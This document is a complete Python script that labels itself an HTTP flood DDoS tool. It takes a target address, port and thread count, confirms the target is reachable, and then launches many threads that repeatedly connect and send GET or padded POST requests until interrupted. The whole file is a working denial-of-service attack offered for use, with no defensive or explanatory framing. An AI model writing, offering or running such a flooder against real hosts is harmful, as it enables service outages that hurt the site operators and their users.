import socket
import threading
import time
import sys
import argparse
import random

DEFAULT_THREADS = 100  
TARGET = "TARGET_IP" 
PORT = 8000

request_count = 0
stop_event = threading.Event()

def parse_arguments():
    parser = argparse.ArgumentParser(description="Simple HTTP Flood DDoS Script")
    parser.add_argument("--target", default=TARGET, help="Target IP address or domain")
    parser.add_argument("--port", type=int, default=PORT, help="Target port")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Number of threads")
    return parser.parse_args()

def check_target(target, port):
    try:
        ip_address = socket.gethostbyname(target)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip_address, port))
        print(f"[INFO] Connected to {target} ({ip_address}:{port}) - Start attack...")
        s.close()
        return True
    except:
        print(f"[ERROR] Cannot connect to {target}")
        return False

def attack(target, port):
    global request_count
    while not stop_event.is_set():
        s = None
        try:
            ip_address = socket.gethostbyname(target)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
            s.settimeout(1)
            s.connect((ip_address, port))

            if random.choice([True, False]):
                payload = b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n"
            else:
                payload = b"POST / HTTP/1.1\r\nHost: " + target.encode() + b"\r\nContent-Length: 100\r\n\r\n" + b"A" * 100

            s.send(payload)
            request_count += 1
            if request_count % 100 == 0:  
                print(f"[INFO] Sent {request_count} requests to {target}")
        except:
            pass
        finally:
            if s:
                s.close() 

def main():
    args = parse_arguments()
    target = args.target
    port = args.port
    num_threads = args.threads

    if not check_target(target, port):
        print("[ERROR] Program is exited! Cannot connect to target.")
        sys.exit(1)

    threads = []
    print(f"[INFO] Initialized {num_threads} threads to attack {target}:{port}...")
    for i in range(num_threads):
        t = threading.Thread(target=attack, args=(target, port))
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[STOP] Stopping attack...")
        stop_event.set()
        for t in threads:
            t.join()
        print("[STOP] Attack stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()
